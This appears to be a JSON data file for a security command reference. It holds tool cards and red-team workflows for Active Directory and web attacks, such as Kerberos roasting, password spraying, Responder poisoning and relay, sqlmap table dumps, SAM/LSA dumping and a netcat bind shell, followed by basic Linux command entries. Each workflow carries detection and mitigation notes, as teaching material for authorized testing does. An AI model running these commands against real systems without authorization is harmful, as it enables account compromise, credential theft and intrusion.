 {"id":"tool-kerbrute","updated":"2026-07","cat":"Tools","title":"kerbrute","desc":"Fast Kerberos pre-auth username enumeration and password spraying.","url":"https://www.kali.org/tools/kerbrute/","license":"open source","platforms":["linux"],"tags":["password","active-directory","tools"],"steps":[{"title":"Enumerate valid usernames","cmd":"kerbrute userenum -d {{DOMAIN:corp.local}} --dc {{DC:10.0.0.10}} users.txt","note":"Uses Kerberos pre-authentication to confirm which usernames exist, and it's quieter than login attempts because it doesn't generate the usual failed-logon events."},{"title":"Password-spray the domain","cmd":"kerbrute passwordspray -d {{DOMAIN:corp.local}} --dc {{DC:10.0.0.10}} users.txt {{PASS:Spring2024!}}","note":"Tries a single password against every user. Check the domain lockout policy first and space out sprays so you don't lock accounts. Authorized only."},{"title":"Brute-force one user's password","cmd":"kerbrute bruteuser -d {{DOMAIN:corp.local}} --dc {{DC:10.0.0.10}} {{WORDLIST:/usr/share/wordlists/rockyou.txt}} {{USER:admin}}","optional":true,"note":"bruteuser tries many passwords against a single account — powerful but the fastest way to trip a lockout, so use it deliberately."}],"install":{"linux":"sudo apt install kerbrute"}},
 {"id":"tool-smbclient","updated":"2026-07","cat":"Tools","title":"smbclient","desc":"FTP-like client for accessing SMB/CIFS shares (part of Samba).","url":"https://www.samba.org/","license":"open source","platforms":["linux"],"tags":["smb","enumeration","network","tools"],"steps":[{"title":"List a host's shares","cmd":"smbclient -L //{{TARGET:10.0.0.5}} -N","note":"-L lists shares and -N attempts a null (no-password) session, showing what's reachable before you have any credentials."},{"title":"Connect to a share","cmd":"smbclient //{{TARGET:10.0.0.5}}/{{SHARE:public}} -U {{USER:guest}}","note":"Opens an FTP-like prompt where ls, cd, get, and put work — the interactive way to explore and pull files from a share."},{"title":"Grab a file non-interactively","cmd":"smbclient //{{TARGET:10.0.0.5}}/{{SHARE:public}} -U {{USER:guest}} -c 'get file.txt'","optional":true,"note":"-c runs the given commands and exits, which is ideal for scripting a quick download without the interactive shell."}],"install":{"linux":"sudo apt install smbclient"}},
 {"id":"tool-rpcclient","updated":"2026-07","cat":"Tools","title":"rpcclient","desc":"MS-RPC client for enumerating Windows/Samba (users, groups, shares) over RPC.","url":"https://www.samba.org/","license":"open source","platforms":["linux"],"tags":["smb","enumeration","active-directory","tools"],"steps":[{"title":"Open a null RPC session","cmd":"rpcclient -U \"\" -N {{TARGET:10.0.0.5}}","note":"-U \"\" with -N connects over MS-RPC with no credentials where the host permits it, dropping you at a prompt to run enumeration commands."},{"title":"Enumerate domain users","cmd":"rpcclient -U \"\" -N {{TARGET:10.0.0.5}} -c 'enumdomusers'","note":"-c runs a single command and exits; enumdomusers lists account names and their RIDs, the starting point for user-focused attacks."},{"title":"Query a specific account","cmd":"rpcclient -U \"\" -N {{TARGET:10.0.0.5}} -c 'queryuser 0x1f4'","optional":true,"note":"queryuser shows a user's details by RID. Other handy commands include querydominfo, enumdomgroups, and lsaenumsid for SID enumeration."}],"install":{"linux":"sudo apt install smbclient"}},
 {"id":"tool-tshark","updated":"2026-07","cat":"Tools","title":"tshark (Wireshark CLI)","desc":"Command-line network protocol analyzer - capture and dissect packets like Wireshark.","url":"https://www.wireshark.org/","license":"open source","platforms":["linux"],"tags":["network","tools"],"steps":[{"title":"Capture with a filter","cmd":"tshark -i {{IFACE:eth0}} -f 'tcp port 80'","note":"tshark is Wireshark's command line. -f applies a capture (BPF) filter so only matching traffic is recorded."},{"title":"Read a pcap with a display filter","cmd":"tshark -r cap.pcap -Y 'http.request'","note":"-Y takes Wireshark display filters (http.request, dns, ip.addr==...), the same powerful syntax you'd use in the GUI."},{"title":"Extract specific fields","cmd":"tshark -r cap.pcap -T fields -e ip.src -e http.host","note":"-T fields with one or more -e options pulls named values into columns — perfect for turning a capture into greppable data."},{"title":"Get conversation statistics","cmd":"tshark -r cap.pcap -q -z conv,tcp","optional":true,"note":"-z produces statistics (conversations, endpoints, I/O) and -q hides the per-packet output, giving you a quick summary of who talked to whom."}],"install":{"linux":"sudo apt install tshark"}},
 {"id":"tool-netcat","updated":"2026-07","cat":"Tools","title":"netcat (nc)","desc":"The TCP/IP swiss-army knife: connect, listen, transfer data, and port-probe.","url":"https://www.kali.org/tools/netcat/","license":"open source","platforms":["linux"],"tags":["network","tools"],"steps":[{"title":"Listen for a connection","cmd":"nc -lvnp {{PORT:4444}}","note":"-l listen, -v verbose, -n skip DNS, -p port. This is the classic catcher for a reverse shell or an inbound file transfer."},{"title":"Connect and grab a banner","cmd":"nc {{TARGET:10.0.0.5}} {{PORT:80}}","note":"Opens a raw TCP connection so you can read a service banner or type a request by hand — a quick way to probe an unknown port."},{"title":"Transfer a file over TCP","cmd":"nc -lvnp {{PORT:4444}} > out.bin","note":"Run this on the receiver, then on the sender: 'nc {{TARGET:10.0.0.5}} {{PORT:4444}} < in.bin'. It's a fast, protocol-free way to move a file between hosts."},{"title":"Spawn a shell on connect","cmd":"nc -lvnp {{PORT:4444}} -e /bin/bash","optional":true,"note":"-e runs a program (here bash) for whoever connects — a bind shell. Many modern netcat builds drop -e, so a mkfifo/socat one-liner is the fallback."}],"install":{"linux":"sudo apt install netcat-traditional"}},
 {"id":"tool-seclists","updated":"2026-07","cat":"Tools","title":"SecLists","desc":"Curated collection of wordlists: usernames, passwords, fuzzing payloads, discovery lists.","url":"https://www.kali.org/tools/seclists/","license":"open source","platforms":["linux"],"tags":["password","web","reference","tools"],"install":{"linux":"sudo apt install seclists"}},
 {"id":"wf-nmap","requires":{"tool":"nmap"},"level":"intermediate","updated":"2026-07","example_output":"Nmap scan report for 10.0.0.5\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 9.6\n80/tcp  open  http    nginx 1.24.0\n445/tcp open  microsoft-ds Samba smbd 4.x","cat":"Reconnaissance","team":"red","title":"Nmap - full recon workflow","desc":"End-to-end host discovery -> port sweep -> deep service/version -> NSE vuln scan.","danger":"Authorized targets only; port/NSE scanning is intrusive and logged.","tags":["recon","network","scanning"],"attack":["T1046"],"detect":"Sequential connections across many ports/hosts, SYN scans, and NSE probe signatures in IDS/flow logs.","mitigate":"Minimize exposed services, rate-limit, and alert on scan patterns; use host firewalls.","code":{"linux":"# 1) discover live hosts\nnmap -sn {{CIDR:10.0.0.0/24}} -oG live.txt\n# 2) fast top-ports sweep of live hosts\nnmap -T4 --top-ports 1000 -iL <(awk '/Up$/{print $2}' live.txt) -oA top\n# 3) deep service/version + default scripts, all ports\nnmap -sC -sV -p- {{TARGET:10.0.0.5}} -oA full\n# 4) targeted NSE vuln scripts\nnmap --script vuln -p {{PORTS:80,443,445}} {{TARGET:10.0.0.5}} -oN vuln.txt"},"related":["recon-nmap-sweep","recon-nmap-top","recon-nmap-vuln","recon-host-discovery"]},
 {"id":"wf-sqlmap","level":"advanced","requires":{"tool":"sqlmap"},"updated":"2026-07","cat":"Web App Testing","team":"red","title":"sqlmap - SQL injection workflow","desc":"Detect injection, enumerate the DBMS and databases, then dump a target table.","danger":"Intrusive; can modify/exfiltrate data. Authorized testing only.","tags":["web","exploitation"],"attack":["T1190"],"detect":"SQL errors/time-delays, tautologies, and UNION payloads in web/DB logs; sqlmap User-Agent.","mitigate":"Parameterized queries, least-privilege DB accounts, input validation, and a WAF.","code":{"linux":"# save the request from your proxy to req.txt first\n# 1) detect injection\nsqlmap -r req.txt --batch --level 3 --risk 2\n# 2) enumerate databases\nsqlmap -r req.txt --batch --dbs\n# 3) list tables in a DB\nsqlmap -r req.txt --batch -D {{DB:appdb}} --tables\n# 4) dump a table\nsqlmap -r req.txt --batch -D {{DB:appdb}} -T {{TABLE:users}} --dump"},"related":["web-sqlmap","web-commix"]},
 {"id":"wf-hashcat","level":"advanced","requires":{"tool":"hashid"},"updated":"2026-07","cat":"Password Auditing","team":"red","title":"hashcat - cracking workflow","desc":"Identify the hash, then escalate from dictionary to rules to mask, and show results.","danger":"Crack only hashes you are authorized to audit.","tags":["password"],"attack":["T1110.002"],"detect":"Offline - no target signal. Detect the upstream theft (LSASS/SAM/NTDS dump) that produced the hashes.","mitigate":"Long unique passphrases, slow salted hashes, MFA; monitor for credential-dumping upstream.","code":{"linux":"# 1) identify the hash -> hashcat mode number\nhashid '{{HASH:$1$abc$...}}'\n# 2) straight dictionary\nhashcat -m {{MODE:1000}} hashes.txt /usr/share/wordlists/rockyou.txt\n# 3) wordlist + rules\nhashcat -m {{MODE:1000}} hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n# 4) mask brute force (8 chars, any)\nhashcat -m {{MODE:1000}} hashes.txt -a 3 '?a?a?a?a?a?a?a?a'\n# 5) show cracked\nhashcat -m {{MODE:1000}} hashes.txt --show"},"related":["pw-hashid","pw-hashcat-modes","pw-hashcat-rules","pw-hashcat-mask"]},
 {"id":"wf-netexec","level":"advanced","requires":{"tool":"NetExec"},"updated":"2026-07","cat":"Active Directory Attacks","team":"red","title":"NetExec (nxc) - SMB/AD sweep workflow","desc":"Validate creds across hosts, enumerate shares/users/policy, then dump SAM & LSA where local admin.","danger":"Authorized engagements only; spraying can trigger account lockouts.","tags":["active-directory","smb","password"],"attack":["T1110.003"],"detect":"Type-3 logon bursts across many hosts from one source (4624/4625), SMB share enumeration, remote SAM/LSA access.","mitigate":"SMB signing, LAPS, tiered admin, lockout policy, and cross-host authentication alerting.","code":{"linux":"# 1) auth check / spray across a subnet (Pwn3d! = local admin)\nnxc smb {{CIDR:10.0.0.0/24}} -u {{USER:svc}} -p '{{PASS:Winter2025!}}'\n# 2) enumerate shares\nnxc smb {{TARGET:10.0.0.5}} -u {{USER}} -p '{{PASS}}' --shares\n# 3) domain users + password policy from the DC\nnxc smb {{DC:10.0.0.10}} -u {{USER}} -p '{{PASS}}' --users --pass-pol\n# 4) dump SAM/LSA where admin\nnxc smb {{TARGET:10.0.0.5}} -u {{USER}} -p '{{PASS}}' --sam --lsa"},"related":["adx-spray-netexec","recon-smb-shares","pw-secretsdump"]},
 {"id":"wf-responder","level":"advanced","requires":{"elevation":true,"tool":"responder"},"updated":"2026-07","cat":"Post-Exploitation","team":"red","title":"Responder - LLMNR/NBT-NS poisoning workflow","desc":"Poison broadcast name resolution to capture NetNTLM hashes, then crack or relay them.","danger":"Intercepts other users' authentication. Authorized, isolated testing only.","tags":["active-directory","network","password"],"attack":["T1557.001"],"detect":"Rogue answers to LLMNR/NBT-NS/mDNS, multiple names resolving to one host, and auth to an unexpected server.","mitigate":"Disable LLMNR/NBT-NS/mDNS, enforce SMB signing, segment the network, and alert on name-service poisoning.","code":{"linux":"# 1) poison and capture (hashes saved under /usr/share/responder/logs/)\nsudo responder -I {{IFACE:eth0}} -wv\n# 2) crack captured NetNTLMv2 (hashcat mode 5600)\nhashcat -m 5600 /usr/share/responder/logs/{{LOGFILE:SMB-NTLMv2-SSP-10.0.0.5.txt}} /usr/share/wordlists/rockyou.txt\n# 3) OR relay instead of crack (disable SMB/HTTP in /etc/responder/Responder.conf first)\nimpacket-ntlmrelayx -tf targets.txt -smb2support"},"related":["pw-hashcat-netntlmv2","post-pass-the-hash-ticket"]},
 {"id":"wf-content-discovery","level":"advanced","requires":{"tool":"gobuster"},"updated":"2026-07","cat":"Web App Testing","team":"red","title":"Web content discovery workflow (gobuster/ffuf/feroxbuster)","desc":"Sweep directories, go recursive, fuzz parameters, then hunt virtual hosts.","danger":"Authorized targets only; brute-forcing generates heavy traffic.","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"High-volume requests iterating a wordlist against one host; bursts of 404/403.","mitigate":"Rate-limiting, WAF, and monitoring for content-discovery patterns.","code":{"linux":"# 1) quick directory sweep\ngobuster dir -u https://{{TARGET:example.com}} -w /usr/share/seclists/Discovery/Web-Content/common.txt\n# 2) recursive discovery\nferoxbuster -u https://{{TARGET:example.com}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n# 3) fuzz paths/values\nffuf -u 'https://{{TARGET:example.com}}/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,204,301,302,307,401,403\n# 4) virtual-host discovery\nffuf -u https://{{TARGET:example.com}} -H 'Host: FUZZ.{{TARGET:example.com}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"},"related":["web-gobuster-dir","web-feroxbuster","web-ffuf-param","web-ffuf-dir"]},
 {"id":"wf-wpscan","level":"advanced","requires":{"tool":"wpscan"},"updated":"2026-07","cat":"Web App Testing","team":"red","title":"WPScan - WordPress workflow","desc":"Enumerate plugins/themes/users, then password-guess a discovered account.","danger":"Authorized targets only.","tags":["web","enumeration"],"attack":["T1595.002"],"detect":"WPScan User-Agent, /wp-json/ user enumeration, and xmlrpc/login brute traffic.","mitigate":"Limit login attempts, disable XML-RPC/user enumeration, keep plugins patched, and use a WAF.","code":{"linux":"# 1) enumerate (add --api-token for vuln data)\nwpscan --url https://{{TARGET:example.com}} -e ap,at,u --plugins-detection aggressive\n# 2) password-guess a user\nwpscan --url https://{{TARGET:example.com}} -U {{USER:admin}} -P /usr/share/wordlists/rockyou.txt"},"related":["web-wpscan","recon-wpscan"]},
 {"id":"wf-hydra","level":"advanced","requires":{"tool":"hydra"},"updated":"2026-07","cat":"Password Auditing","team":"red","title":"Hydra - login brute-force workflow","desc":"Online credential guessing against network services and web login forms.","danger":"Can lock out accounts and is very noisy. Authorized testing only.","tags":["password","network"],"attack":["T1110.001"],"detect":"Many failed authentications from one source (4625 / SSH auth.log), and account lockouts.","mitigate":"MFA, lockout/backoff, fail2ban, and source-based alerting on auth failures.","code":{"linux":"# SSH\nhydra -l {{USER:root}} -P /usr/share/wordlists/rockyou.txt ssh://{{TARGET:10.0.0.5}}\n# HTTP POST login form (tune the failure string F=)\nhydra -L users.txt -P rockyou.txt {{TARGET:10.0.0.5}} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"},"related":["pw-hydra-ssh","pw-hydra-http","pw-medusa"]},
 {"id":"wf-evil-winrm","level":"advanced","requires":{"tool":"evil-winrm"},"updated":"2026-07","cat":"Post-Exploitation","team":"red","title":"evil-winrm - post-exploitation workflow","desc":"Connect over WinRM (password or hash), enumerate privileges, and move tools/loot.","danger":"Authorized access only; creates remote-service logons and process activity.","tags":["post-ex","remote","active-directory"],"attack":["T1021.006"],"detect":"WinRM logons (4624 type 3 to WSMan), wsmprovhost.exe children, and 5985/5986 traffic.","mitigate":"Restrict WinRM to admin hosts, require TLS, monitor 4624/wsmprovhost, and enforce least privilege.","code":{"linux":"# 1) connect (password, or -H <NTLM> for pass-the-hash)\nevil-winrm -i {{TARGET:10.0.0.5}} -u {{USER:administrator}} -p '{{PASS:Password1}}'\n# in-session:\n*Evil-WinRM* PS> whoami /all\n*Evil-WinRM* PS> upload /opt/PrivescCheck.ps1\n*Evil-WinRM* PS> download C:\\\\Users\\\\admin\\\\Desktop\\\\loot.txt ./loot.txt"},"related":["post-evil-winrm","post-pass-the-hash-ticket","pe-winpeas"]},
 {"id":"wf-smb-access","level":"advanced","updated":"2026-07","cat":"Reconnaissance","team":"red","title":"SMB access & enumeration workflow (smbclient/smbmap/rpcclient)","desc":"List and browse shares, then RID-cycle users over RPC via a null or authed session.","danger":"Authorized targets only.","tags":["smb","enumeration","network"],"attack":["T1135"],"detect":"Anonymous/null-session logons (4624 type 3), share and user enumeration over SMB/RPC.","mitigate":"Disable null sessions, restrict SMB and RestrictAnonymous, least-privilege shares, and monitor anonymous access.","code":{"linux":"# 1) list shares (null session or creds)\nsmbclient -L //{{TARGET:10.0.0.5}}/ -N\nsmbmap -H {{TARGET:10.0.0.5}} -u {{USER:guest}} -p ''\n# 2) connect to a share\nsmbclient //{{TARGET:10.0.0.5}}/{{SHARE:Data}} -U {{USER:guest}}\n# 3) RID-cycle domain users over RPC\nrpcclient -U '' -N {{TARGET:10.0.0.5}} -c 'enumdomusers'"},"related":["recon-smb-shares","recon-smb-enum","adx-null-session-rid"]},
 {"id":"wf-kerberos-roast","level":"advanced","requires":{"tool":"kerbrute"},"updated":"2026-07","cat":"Active Directory Attacks","team":"red","title":"Kerberos roasting workflow (kerbrute + roasting)","desc":"Enumerate valid users, AS-REP roast no-preauth accounts, Kerberoast SPNs, then crack.","danger":"Authorized engagements only; roasting touches the DC and is logged.","tags":["active-directory","password"],"attack":["T1558.003"],"detect":"Mass TGS-REQ / RC4 tickets (4769), AS-REQ without pre-auth (4768), and username-spray bursts.","mitigate":"Strong service-account passwords or gMSA, disable RC4, require pre-auth, and alert on mass 4769.","code":{"linux":"# 1) enumerate valid usernames (no lockout)\nkerbrute userenum -d {{DOMAIN:corp.local}} --dc {{DC:10.0.0.10}} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt\n# 2) AS-REP roast (no-preauth users)\nimpacket-GetNPUsers {{DOMAIN}}/ -dc-ip {{DC}} -usersfile users.txt -no-pass -format hashcat\n# 3) Kerberoast SPN accounts (needs any valid creds)\nimpacket-GetUserSPNs {{DOMAIN}}/{{USER:svc}}:'{{PASS:pass}}' -dc-ip {{DC}} -request -outputfile spns.txt\n# 4) crack (AS-REP m=18200, TGS m=13100)\nhashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt"},"related":["adx-kerbrute-userenum","adx-asrep-impacket","adx-kerberoast-impacket","adx-spn-discover"]},
 {"id":"wf-nuclei","level":"advanced","requires":{"tool":"nuclei"},"updated":"2026-07","cat":"Web App Testing","team":"red","title":"Nuclei - templated scanning workflow","desc":"Update templates, run a scoped scan, then narrow by severity/tags and scale to a host list.","danger":"Authorized targets only; templates send active probes.","tags":["web","detection"],"attack":["T1595.002"],"detect":"Bursts of templated requests with known payloads; Nuclei User-Agent in web logs.","mitigate":"Patch exposed services, WAF, and alert on known-CVE probe signatures.","code":{"linux":"# 1) update templates\nnuclei -update-templates\n# 2) scoped scan of one target\nnuclei -u https://{{TARGET:example.com}}\n# 3) narrow by severity/tags\nnuclei -u https://{{TARGET:example.com}} -severity critical,high -tags cve,exposure\n# 4) scale to a host list (rate-limited)\nnuclei -l hosts.txt -rl 50 -o findings.txt"},"related":["web-nuclei","web-httpx"]},
 {"id":"lx-pwd","level":"beginner","example_output":"/home/alice","cat":"Linux Essentials","title":"pwd - print the current directory","desc":"Show the full path of the folder you're currently in.","tags":["linux","reference","teaching"],"code":{"linux":"pwd            # where am I?"}},
 {"id":"lx-ls","level":"beginner","example_output":"drwxr-xr-x  2 alice alice 4096 Jul  4 10:12 docs\n-rw-r--r--  1 alice alice  180 Jul  4 09:55 notes.txt\n-rwxr-xr-x  1 alice alice  512 Jul  3 22:01 deploy.sh","cat":"Linux Essentials","title":"ls - list directory contents","desc":"List files and folders, optionally with details.","tags":["linux","reference","teaching"],"code":{"linux":"ls\nls -lah        # long list, all files, human sizes\nls -lt         # newest first"}},
 {"id":"lx-cd","level":"beginner","cat":"Linux Essentials","title":"cd - change directory","desc":"Move between folders in the shell.","tags":["linux","reference","teaching"],"code":{"linux":"cd {{DIR:/etc}}\ncd ..          # up one level\ncd ~           # your home\ncd -           # previous directory"}},
 {"id":"lx-mkdir","level":"beginner","cat":"Linux Essentials","title":"mkdir - make directories","desc":"Create one or more new folders.","tags":["linux","reference","teaching"],"code":{"linux":"mkdir {{DIR:project}}\nmkdir -p a/b/c   # create parent folders as needed"}},
 {"id":"lx-rmdir","level":"beginner","cat":"Linux Essentials","title":"rmdir - remove empty directories","desc":"Delete folders that are already empty.","tags":["linux","reference","teaching"],"code":{"linux":"rmdir {{DIR:olddir}}   # for non-empty dirs use: rm -r"}},
 {"id":"lx-rm","level":"beginner","cat":"Linux Essentials","title":"rm - remove files and directories","desc":"Delete files or folders (permanently - no recycle bin).","tags":["linux","reference","teaching"],"code":{"linux":"rm {{FILE:file.txt}}\nrm -r {{DIR:folder}}     # recursive\nrm -i *.log             # ask before each"},"danger":"Deletions are permanent. `rm -rf` cannot be undone - double-check the path."},
 {"id":"lx-cp","level":"beginner","cat":"Linux Essentials","title":"cp - copy files and directories","desc":"Copy files or whole folders to a new location.","tags":["linux","reference","teaching"],"code":{"linux":"cp {{SRC:a.txt}} {{DST:b.txt}}\ncp -r {{SRC:dir}} {{DST:backup}}   # recursive\ncp -a src/. dest/                 # preserve attributes"}},
 {"id":"lx-mv","level":"beginner","cat":"Linux Essentials","title":"mv - move or rename","desc":"Move files into another folder, or rename them.","tags":["linux","reference","teaching"],"code":{"linux":"mv {{SRC:old.txt}} {{DST:new.txt}}   # rename\nmv *.jpg {{DIR:images/}}             # move into a folder"}},
 {"id":"lx-touch","level":"beginner","cat":"Linux Essentials","title":"touch - create a file / update its timestamp","desc":"Make an empty file, or bump a file's modified time.","tags":["linux","reference","teaching"],"code":{"linux":"touch {{FILE:notes.txt}}\ntouch -d '2025-01-01' {{FILE:notes.txt}}"}},
 {"id":"lx-ln","level":"beginner","cat":"Linux Essentials","title":"ln - create links (shortcuts)","desc":"Make a symbolic link that points to another file or folder.","tags":["linux","reference","teaching"],"code":{"linux":"ln -s {{TARGET:/opt/app/bin}} {{LINK:app}}   # symlink\nreadlink -f {{LINK:app}}                     # resolve it"}},
 {"id":"lx-find","level":"beginner","cat":"Linux Essentials","title":"find - search for files and directories","desc":"Search a folder tree by name, type, size, or age.","tags":["linux","reference","teaching"],"code":{"linux":"find {{DIR:.}} -name '*.log'\nfind . -type f -mtime -1     # changed in last day\nfind . -size +100M           # larger than 100 MB"}},
 {"id":"lx-locate","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"locate - fast filename search","desc":"Instantly find files by name using a prebuilt index.","tags":["linux","reference","teaching"],"code":{"linux":"sudo updatedb          # refresh the index\nlocate {{NAME:sshd_config}}"}},
 {"id":"lx-stat","level":"beginner","cat":"Linux Essentials","title":"stat - detailed file information","desc":"Show a file's size, permissions, owner, and timestamps.","tags":["linux","reference","teaching"],"code":{"linux":"stat {{FILE:file.txt}}"}},
 {"id":"lx-file","level":"beginner","cat":"Linux Essentials","title":"file - identify a file's type","desc":"Tell what a file actually is, regardless of its extension.","tags":["linux","reference","teaching"],"code":{"linux":"file {{FILE:mystery.bin}}"}},
 {"id":"lx-tree","level":"beginner","cat":"Linux Essentials","title":"tree - show a directory as a tree","desc":"Visualise nested folders and files as an indented tree.","tags":["linux","reference","teaching"],"code":{"linux":"tree {{DIR:.}}\ntree -L 2      # limit depth to 2 levels"}},
 {"id":"lx-cat","level":"beginner","cat":"Linux Essentials","title":"cat - print or join files","desc":"Print a file to the screen, or concatenate several files.","tags":["linux","reference","teaching"],"code":{"linux":"cat {{FILE:file.txt}}\ncat a.txt b.txt > combined.txt"}},
 {"id":"lx-less","level":"beginner","cat":"Linux Essentials","title":"less - scroll through a file","desc":"Page through a large file interactively.","tags":["linux","reference","teaching"],"code":{"linux":"less {{FILE:bigfile.log}}   # q quit, / search, G end, g start"}},
 {"id":"lx-head","level":"beginner","cat":"Linux Essentials","title":"head - first lines of a file","desc":"Show the beginning of a file (10 lines by default).","tags":["linux","reference","teaching"],"code":{"linux":"head {{FILE:file.txt}}\nhead -n 20 {{FILE:file.txt}}"}},
 {"id":"lx-tail","level":"beginner","cat":"Linux Essentials","title":"tail - last lines / follow a file","desc":"Show the end of a file, or watch it update live.","tags":["linux","reference","teaching"],"code":{"linux":"tail {{FILE:file.txt}}\ntail -n 50 {{FILE:file.log}}\ntail -f /var/log/syslog     # live follow"}},
 {"id":"lx-wc","level":"beginner","cat":"Linux Essentials","title":"wc - count lines, words, and bytes","desc":"Count how many lines, words, or characters a file has.","tags":["linux","reference","teaching"],"code":{"linux":"wc -l {{FILE:file.txt}}   # lines\nwc -w {{FILE:file.txt}}   # words"}},
 {"id":"lx-echo","level":"beginner","cat":"Linux Essentials","title":"echo - print text or variables","desc":"Output text or the value of a variable.","tags":["linux","reference","teaching"],"code":{"linux":"echo \"Hello\"\necho \"Home is $HOME\"\necho -n \"no newline\""}},
 {"id":"lx-tee","level":"beginner","cat":"Linux Essentials","title":"tee - write to a file and the screen","desc":"Save command output to a file while still showing it.","tags":["linux","reference","teaching"],"code":{"linux":"echo hi | tee {{FILE:out.txt}}\n{{CMD:some-command}} | tee -a log.txt   # append"}},
 {"id":"lx-xargs","level":"beginner","cat":"Linux Essentials","title":"xargs - build commands from input","desc":"Turn a list of items into arguments for another command.","tags":["linux","reference","teaching"],"code":{"linux":"find . -name '*.tmp' | xargs rm -f\necho a b c | xargs -n1 echo"}},
 {"id":"lx-chmod","level":"beginner","cat":"Linux Essentials","title":"chmod - change file permissions","desc":"Set who can read, write, or run a file.","tags":["linux","reference","teaching"],"code":{"linux":"chmod +x {{FILE:script.sh}}   # make executable\nchmod 644 {{FILE:file}}       # rw-r--r--\nchmod -R 750 {{DIR:dir}}"}},
 {"id":"lx-chown","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"chown - change file owner","desc":"Change which user (and group) owns a file.","tags":["linux","reference","teaching"],"code":{"linux":"sudo chown {{USER:alice}} {{FILE:file}}\nsudo chown alice:staff {{FILE:file}}\nsudo chown -R alice {{DIR:dir}}"}},
 {"id":"lx-chgrp","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"chgrp - change a file's group","desc":"Change the group that owns a file.","tags":["linux","reference","teaching"],"code":{"linux":"sudo chgrp {{GROUP:developers}} {{FILE:file}}"}},
 {"id":"lx-umask","level":"beginner","cat":"Linux Essentials","title":"umask - default permissions for new files","desc":"Control the permissions newly created files get.","tags":["linux","reference","teaching"],"code":{"linux":"umask          # show current mask\numask 027      # new files not world-readable"}},
 {"id":"lx-useradd","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"useradd - create a user account","desc":"Add a new local user (create home dir and set a shell).","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo useradd -m -s /bin/bash {{USER:alice}}\nsudo passwd {{USER:alice}}"},"danger":"Creates a system account. Run as root/sudo."},
 {"id":"lx-usermod","requires":{"elevation":true},"level":"beginner","updated":"2026-07","cat":"Linux Essentials","title":"usermod - modify a user account","desc":"Change an existing user: groups, shell, name, or lock state.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo usermod -aG {{GROUP:sudo}} {{USER:alice}}   # add to a group (-a keeps existing groups!)\nsudo usermod -s /bin/zsh {{USER:alice}}          # change login shell\nsudo usermod -L {{USER:alice}}                   # lock the account"},"danger":"Omitting -a with -G replaces all of a user's groups. Run as root/sudo."},
 {"id":"lx-userdel","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"userdel - delete a user account","desc":"Remove a local user, optionally with their home folder.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo userdel {{USER:alice}}\nsudo userdel -r {{USER:alice}}   # also delete home dir + mail"},"danger":"Permanently removes the account (and files with -r)."},
 {"id":"lx-passwd","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"passwd - change a password","desc":"Set or change your own or another user's password.","tags":["linux","reference","teaching","account"],"code":{"linux":"passwd                   # change your own\nsudo passwd {{USER:alice}}   # change another user's"}},
 {"id":"lx-groupadd","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"groupadd - create a group","desc":"Add a new local group.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo groupadd {{GROUP:developers}}"}},
 {"id":"lx-groupmod","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"groupmod - modify a group","desc":"Rename a group or change its GID.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo groupmod -n {{NEW:devs}} {{OLD:developers}}   # rename"}},
 {"id":"lx-groupdel","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"groupdel - delete a group","desc":"Remove a local group.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo groupdel {{GROUP:developers}}"}},
 {"id":"lx-id","level":"beginner","example_output":"uid=1000(alice) gid=1000(alice) groups=1000(alice),27(sudo),100(users)","cat":"Linux Essentials","title":"id - show user and group IDs","desc":"Print the UID, GID, and groups for you or another user.","tags":["linux","reference","teaching","account"],"code":{"linux":"id\nid {{USER:alice}}"}},
 {"id":"lx-whoami","level":"beginner","example_output":"alice","cat":"Linux Essentials","title":"whoami - print the current user","desc":"Show which user you're currently running as.","tags":["linux","reference","teaching","account"],"code":{"linux":"whoami"}},
 {"id":"lx-who","level":"beginner","cat":"Linux Essentials","title":"who / w - who is logged in","desc":"List users currently logged into the system.","tags":["linux","reference","teaching","account"],"code":{"linux":"who\nw          # who + what each is doing"}},
 {"id":"lx-su","level":"beginner","cat":"Linux Essentials","title":"su - switch user","desc":"Become another user (or root) in a new shell.","tags":["linux","reference","teaching","account"],"code":{"linux":"su - {{USER:alice}}   # login shell as another user\nsu -            # become root (needs root's password)"}},
 {"id":"lx-sudo","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"sudo - run a command as another user","desc":"Run a single command with elevated (root) privileges.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo {{CMD:apt update}}\nsudo -i               # open a root shell\nsudo -l               # list what you're allowed to run"}},
 {"id":"lx-chage","level":"beginner","requires":{"elevation":true},"cat":"Linux Essentials","title":"chage - password aging","desc":"View or set password expiry / aging for an account.","tags":["linux","reference","teaching","account"],"code":{"linux":"sudo chage -l {{USER:alice}}     # list aging info\nsudo chage -M 90 {{USER:alice}}   # max age 90 days"}},
 {"id":"lx-groups","level":"beginner","example_output":"alice sudo users docker","cat":"Linux Essentials","title":"groups - show a user's groups","desc":"List the groups a user belongs to.","tags":["linux","reference","teaching","account"],"code":{"linux":"groups\ngroups {{USER:alice}}"}},
 {"id":"lx-last","level":"beginner","cat":"Linux Essentials","title":"last - recent login history","desc":"Show recent logins from the system records.","tags":["linux","reference","teaching","account"],"code":{"linux":"last\nlast {{USER:alice}}"}},
